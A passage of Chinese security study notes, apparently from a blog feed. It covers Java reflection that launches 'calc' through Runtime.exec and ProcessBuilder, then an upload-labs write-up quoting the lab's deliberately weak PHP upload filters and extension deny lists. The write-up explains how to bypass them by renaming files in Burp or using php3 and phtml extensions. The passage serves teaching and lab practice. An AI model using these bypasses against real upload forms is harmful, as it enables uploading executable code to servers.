<h3 id="代码-6"><a href="#代码-6" class="headerlink" title="代码"></a>代码</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取成员方法</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Reflection06</span> &#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testReflction</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//获取Class对象</span></span><br><span class="line">        Class&lt;Person&gt; personClass = Person.class;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取全部public成员方法</span></span><br><span class="line">        System.out.println(<span class="string">&quot;----------------------getMethods--------------------------------------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Method[] methods = personClass.getMethods();</span><br><span class="line">        <span class="keyword">for</span> (Method method : methods) &#123;</span><br><span class="line">            System.out.println(method);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取全部成员方法</span></span><br><span class="line">        System.out.println(<span class="string">&quot;----------------------getDeclaredMethods------------------------------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Method[] declaredMethods = personClass.getDeclaredMethods();</span><br><span class="line">        <span class="keyword">for</span> (Method declaredMethod : declaredMethods) &#123;</span><br><span class="line">            System.out.println(declaredMethod);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>输出结果</li>
</ul>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">----------------------getMethods--------------------------------------------------</span><br><span class="line"><span class="keyword">public</span> java.lang.String org.example.Person.toString()</span><br><span class="line"><span class="keyword">public</span> java.lang.String org.example.Person.getName()</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> org.example.Person.setName(java.lang.String)</span><br><span class="line"><span class="keyword">public</span> java.lang.String org.example.Person.eat(java.lang.String)</span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> org.example.Person.getAge()</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> org.example.Person.setAge(<span class="type">int</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> java.lang.Object.wait() <span class="keyword">throws</span> java.lang.InterruptedException</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> java.lang.Object.wait(<span class="type">long</span>,<span class="type">int</span>) <span class="keyword">throws</span> java.lang.InterruptedException</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">native</span> <span class="keyword">void</span> java.lang.Object.wait(<span class="type">long</span>) <span class="keyword">throws</span> java.lang.InterruptedException</span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> java.lang.Object.equals(java.lang.Object)</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">int</span> java.lang.Object.hashCode()</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">native</span> java.lang.Class java.lang.Object.getClass()</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">native</span> <span class="keyword">void</span> java.lang.Object.notify()</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">native</span> <span class="keyword">void</span> java.lang.Object.notifyAll()</span><br><span class="line">----------------------getDeclaredMethods------------------------------------------</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> org.example.Person.run()</span><br><span class="line"><span class="keyword">public</span> java.lang.String org.example.Person.toString()</span><br><span class="line"><span class="keyword">public</span> java.lang.String org.example.Person.getName()</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> org.example.Person.setName(java.lang.String)</span><br><span class="line"><span class="keyword">public</span> java.lang.String org.example.Person.eat(java.lang.String)</span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> org.example.Person.getAge()</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> org.example.Person.setAge(<span class="type">int</span>)</span><br></pre></td></tr></table></figure></div>

<h2 id="执行成员方法"><a href="#执行成员方法" class="headerlink" title="执行成员方法"></a>执行成员方法</h2><h3 id="invoke"><a href="#invoke" class="headerlink" title="invoke()"></a>invoke()</h3><ul>
<li>调用某个类中的方法</li>
<li>如果这个方法是一个<strong>普通</strong>方法，那么第一个参数是<strong>类对象</strong></li>
<li>如果这个方法是一个<strong>静态</strong>方法，那么第一个参数是<strong>类</strong></li>
</ul>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 执行成员方法</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Reflection07</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testReflction</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//获取Class对象</span></span><br><span class="line">        Class&lt;Person&gt; personClass = Person.class;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取某个public成员方法</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">eat</span> <span class="operator">=</span> personClass.getMethod(<span class="string">&quot;eat&quot;</span>,String.class);</span><br><span class="line"><span class="comment">//        System.out.println(eat);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取private成员方法</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">run</span> <span class="operator">=</span> personClass.getDeclaredMethod(<span class="string">&quot;run&quot;</span>);</span><br><span class="line"><span class="comment">//        System.out.println(run);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line"></span><br><span class="line">        run.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">run1</span> <span class="operator">=</span> run.invoke(person,<span class="literal">null</span>);</span><br><span class="line">        System.out.println(run1);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">eat1</span> <span class="operator">=</span> (Object) eat.invoke(person, <span class="string">&quot;鱼&quot;</span>);</span><br><span class="line">        System.out.println(eat1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>输出结果</li>
</ul>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">调用了无参构造器</span><br><span class="line">喜欢跑步</span><br><span class="line"><span class="literal">null</span></span><br><span class="line">喜欢吃鱼</span><br></pre></td></tr></table></figure></div>

<h1 id="0x06-Runtime命令执行"><a href="#0x06-Runtime命令执行" class="headerlink" title="0x06 Runtime命令执行"></a>0x06 Runtime命令执行</h1><h2 id="普通调用"><a href="#普通调用" class="headerlink" title="普通调用"></a>普通调用</h2><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exec</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//弹出计算机</span></span><br></pre></td></tr></table></figure></div>

<h2 id="反射调用"><a href="#反射调用" class="headerlink" title="反射调用"></a>反射调用</h2><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exec</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="comment">//        Runtime.getRuntime().exec(&quot;calc&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//得到 Class 对象</span></span><br><span class="line">        Class&lt;?&gt; runtimeClass = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        <span class="comment">//得到 getRuntime 方法</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">getRuntime</span> <span class="operator">=</span> runtimeClass.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">        <span class="comment">//调用 Runtime.getRuntime() 方法,得到 Runtime 对象</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">Runtime</span> <span class="operator">=</span> getRuntime.invoke(runtimeClass);</span><br><span class="line">        <span class="comment">//得到 exec 方法</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">exec</span> <span class="operator">=</span> runtimeClass.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        exec.invoke(Runtime,<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//弹出计算机</span></span><br></pre></td></tr></table></figure></div>

<h1 id="0x07-ProcessBuilder命令调用"><a href="#0x07-ProcessBuilder命令调用" class="headerlink" title="0x07 ProcessBuilder命令调用"></a>0x07 ProcessBuilder命令调用</h1><h2 id="普通调用-1"><a href="#普通调用-1" class="headerlink" title="普通调用"></a>普通调用</h2><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProcessBuilder</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//利用 ProcessBuilder 进行命令执行</span></span><br><span class="line">        java.lang.<span class="type">ProcessBuilder</span> <span class="variable">processBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">        <span class="type">Process</span> <span class="variable">start</span> <span class="operator">=</span> processBuilder.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//弹出计算机</span></span><br></pre></td></tr></table></figure></div>

<h2 id="反射调用-1"><a href="#反射调用-1" class="headerlink" title="反射调用"></a>反射调用</h2><ul>
<li><strong>ProcessBuilder(List<String> command)</strong></li>
</ul>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProcessBuilder</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//利用 ProcessBuilder 进行命令执行</span></span><br><span class="line">        <span class="comment">//获取 Class 对象</span></span><br><span class="line">        Class&lt;?&gt; ProcessBuilder = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">        <span class="comment">//获取构造器方法</span></span><br><span class="line">        Constructor&lt;?&gt; constructor = ProcessBuilder.getConstructor(List.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Arrays.asList()用于将一个数组转换成List对象</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">calc</span> <span class="operator">=</span> constructor.newInstance(Arrays.asList(<span class="string">&quot;calc&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取成员方法</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">start</span> <span class="operator">=</span> ProcessBuilder.getMethod(<span class="string">&quot;start&quot;</span>);</span><br><span class="line"></span><br><span class="line">        start.invoke(calc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//弹出计算机</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>public ProcessBuilder(String… command)</strong></li>
</ul>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProcessBuilder</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//利用 ProcessBuilder 进行命令执行</span></span><br><span class="line">        <span class="comment">//获取 Class 对象</span></span><br><span class="line">        Class&lt;?&gt; processBuilder = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取构造器方法</span></span><br><span class="line">        Constructor&lt;?&gt; constructor = processBuilder.getConstructor(String[].class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//可变长参数在编译时会编译成一个数组</span></span><br><span class="line">        <span class="comment">//newInstance也是接受一个可变长参数</span></span><br><span class="line">        <span class="comment">//二者叠加为一个二维数组</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">calc</span> <span class="operator">=</span> constructor.newInstance(<span class="keyword">new</span> <span class="title class_">String</span>[][]&#123;&#123;<span class="string">&quot;calc&quot;</span>&#125;&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取start方法</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">start</span> <span class="operator">=</span> processBuilder.getMethod(<span class="string">&quot;start&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//执行方法</span></span><br><span class="line">        start.invoke(calc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//弹出计算机</span></span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>Java学习</category>
      </categories>
      <tags>
        <tag>反射</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-labs</title>
    <url>/2023/08/18/%E9%9D%B6%E5%9C%BA/upload-labs/</url>
    <content><![CDATA[<h1 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h1><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">checkFile</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> file = <span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].<span class="property">value</span>;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.<span class="title function_">substring</span>(file.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.<span class="title function_">indexOf</span>(ext_name + <span class="string">&quot;|&quot;</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">        <span class="title function_">alert</span>(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//代码分析</span></span><br><span class="line"><span class="comment">//只检查了上传文件的后缀名</span></span><br></pre></td></tr></table></figure></div>

<p>思路：</p>
<p>可以先上传符合格式的文件，再通过burp抓包更改后缀为php即可。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/08/18/%E9%9D%B6%E5%9C%BA/upload-labs/image-20230629000722042.png"
                      class="" title="image-20230629000722042"
                >

<p>访问上传的php文件：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/08/18/%E9%9D%B6%E5%9C%BA/upload-labs/image-20230629000831052.png"
                      class="" title="image-20230629000831052"
                >

<h1 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h1><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]            </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH.<span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//代码分析</span></span><br><span class="line"><span class="comment">//检查MINE是否符合可上传类型</span></span><br></pre></td></tr></table></figure></div>

<p>思路：</p>
<p>先上传符合MINE类型的文件，再通过burp抓包更改后缀为php即可。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/08/18/%E9%9D%B6%E5%9C%BA/upload-labs/image-20230629002113505.png"
                      class="" title="image-20230629002113505"
                >

<p>访问上传的php文件：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/08/18/%E9%9D%B6%E5%9C%BA/upload-labs/image-20230629002143557.png"
                      class="" title="image-20230629002143557"
                >

<h1 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h1><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;            </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                 <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//代码分析</span></span><br><span class="line"><span class="comment">//黑名单不允许上传拓展名为asp、aspx、php、jsp的文件</span></span><br><span class="line"><span class="comment">//利用strtolower将拓展名转换成小写</span></span><br><span class="line"><span class="comment">//利用deldot去除后缀末尾中的点</span></span><br><span class="line"><span class="comment">//利用str_ireplace将文件名中的字符串::$DATA替换为空</span></span><br><span class="line"><span class="comment">//利用trim去除文件名首尾的空格</span></span><br><span class="line"><span class="comment">//将上传的文件重新命名</span></span><br></pre></td></tr></table></figure></div>

<p>思路：</p>
<p>黑名单不全，可以利用php3、php5、phtml等拓展名进行绕过（设置了可以当成php解析）</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/08/18/%E9%9D%B6%E5%9C%BA/upload-labs/image-20230629145726595.png"
                      class="" title="image-20230629145726595"
                >

<p>访问上传的php文件：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/08/18/%E9%9D%B6%E5%9C%BA/upload-labs/image-20230629151225211.png"
                      class="" title="image-20230629151225211"
                >

<h1 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h1><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span 